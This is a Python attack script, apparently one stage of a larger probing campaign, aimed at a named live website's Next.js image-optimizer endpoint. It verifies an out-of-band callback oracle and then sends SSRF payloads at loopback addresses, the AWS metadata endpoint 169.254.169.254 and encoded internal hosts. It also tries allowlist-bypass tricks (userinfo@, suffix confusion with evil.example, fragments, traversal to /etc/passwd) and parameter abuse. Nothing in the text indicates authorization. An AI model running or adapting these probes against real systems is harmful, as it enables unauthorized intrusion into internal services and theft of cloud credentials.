#!/usr/bin/env python3
"""W19d: is the OOB oracle trustworthy, and can /_next/image be abused as an SSRF sink?

Earlier workers claimed wildcard-DNS self-resolution making OOB callbacks
meaningless. Verify that control FIRST, then attack the live image optimizer.
"""
import socket, sys, time, urllib.request, urllib.error, urllib.parse

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
BASE = "https://www.infinitycapital.bh"
OOB = "dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

print("=== 0) OOB ORACLE SANITY CHECK (is DNS wildcard?) ===")
for h in ["totallyrandomnonexistent99", "zzzqqq9999zzz", "selftest-control-abc123xyz"]:
    fq = f"{h}.{OOB}"
    try:
        ip = socket.gethostbyname(fq)
    except Exception as e:
        ip = f"ERR {e}"
    print(f"  DNS {fq} -> {ip}")
for h in [f"totallyrandomnonexistent99.{OOB}"]:
    fq = "http://" + h + "/probe"
    try:
        rq = urllib.request.Request(fq, headers={"User-Agent": UA})
        with urllib.request.urlopen(rq, timeout=15) as r:
            b = r.read()
            print(f"  HTTP GET {fq} -> {r.status} {len(b)}B body={b[:120]!r}")
    except Exception as e:
        print(f"  HTTP GET {fq} -> ERR {e}")
    time.sleep(1)


def img(urlparam, w="640", label="", extra_hdrs=None, q="75"):
    full = f"{BASE}/_next/image?url={urllib.parse.quote(urlparam, safe='')}&w={w}&q={q}"
    rq = urllib.request.Request(full, headers={"User-Agent": UA, "Accept": "image/*,*/*"})
    for k, v in (extra_hdrs or {}).items():
        rq.add_header(k, v)
    t0 = time.time()
    try:
        with urllib.request.urlopen(rq, timeout=25) as r:
            b = r.read()
            return f"{label}: {r.status} {len(b)}B {time.time()-t0:.2f}s ct={r.headers.get('content-type')} body={b[:60]!r}"
    except urllib.error.HTTPError as e:
        b = e.read()
        return f"{label}: {e.code} {len(b)}B {time.time()-t0:.2f}s body={b[:120]!r}"
    except Exception as e:
        return f"{label}: ERR {e} {time.time()-t0:.2f}s"


print("\n=== 1) baseline: allowed remotePattern (ctfassets) ===")
print(img("https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg",
         label="ctfassets"))

print("\n=== 2) direct internal / metadata targets (400 = filtered?) ===")
for u, lbl in [
    ("http://127.0.0.1/", "loopback ip"),
    ("http://localhost:3000/", "loopback name"),
    ("http://169.254.169.254/latest/meta-data/", "aws metadata"),
    ("http://[::1]/", "ipv6 loopback"),
    ("http://0.0.0.0/", "zero"),
    ("http://2130706433/", "decimal loopback"),
]:
    print(img(u, label=lbl)); time.sleep(1.5)

print("\n=== 3) allowlist bypass attempts (hostname confusion) ===")
for u, lbl in [
    ("https://images.ctfassets.net@127.0.0.1/", "userinfo@"),
    ("https://images.ctfassets.net@169.254.169.254/latest/meta-data/", "userinfo@meta"),
    ("https://images.ctfassets.net.evil.example/x.jpg", "suffix confusion"),
    ("https://evil.example/?x=images.ctfassets.net", "path confusion"),
    ("http://images.ctfassets.net/x.jpg", "scheme downgrade http"),
    ("//images.ctfassets.net/x.jpg", "protocol-relative"),
    ("https://images.ctfassets.net:443@127.0.0.1/x.jpg", "port userinfo"),
    ("https://127.0.0.1/x.jpg#images.ctfassets.net", "fragment"),
    ("https://images.ctfassets.net/../../../../etc/passwd", "traversal"),
]:
    print(img(u, label=lbl)); time.sleep(1.5)

print("\n=== 4) w / q parameter abuse (non-numeric, huge, negative) ===")
for w, q, lbl in [("abc", "75", "w non-numeric"), ("0", "75", "w=0"),
                  ("99999", "75", "w huge"), ("-1", "75", "w negative"),
                  ("3840", "1", "big w low q")]:
    print(img("https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg",
              w=w, q=q, label=lbl)); time.sleep(1.5)
